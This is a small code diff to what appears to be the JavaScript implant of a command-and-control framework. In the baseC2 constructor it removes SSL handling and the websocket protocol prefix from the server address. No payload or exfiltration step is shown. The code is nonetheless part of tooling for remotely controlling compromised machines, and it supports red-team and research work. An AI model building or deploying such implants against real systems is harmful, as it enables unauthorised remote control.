@@ -14,19 +14,12 @@ var hostarch = "";
 var apfell = new implant();
 //--------------Base C2 INFORMATION---------------------------------------
 class baseC2 {
-    constructor(host, port, endpoint, ssl, interval) {
+    constructor(host, port, endpoint, interval) {
         this.host = host;
         this.port = port;
-        this.proto = '';
         this.interval = interval;
         this.commands = {};
-
-        if (ssl === true) {
-            this.proto = 'wss://';
-        } else {
-            this.proto = 'ws://';
-        }
-        this.server = `${this.proto}${this.host}:${this.port}/${endpoint}`;
+        this.server = `${this.host}:${this.port}/${endpoint}`;
     }
 
     getInterval(){
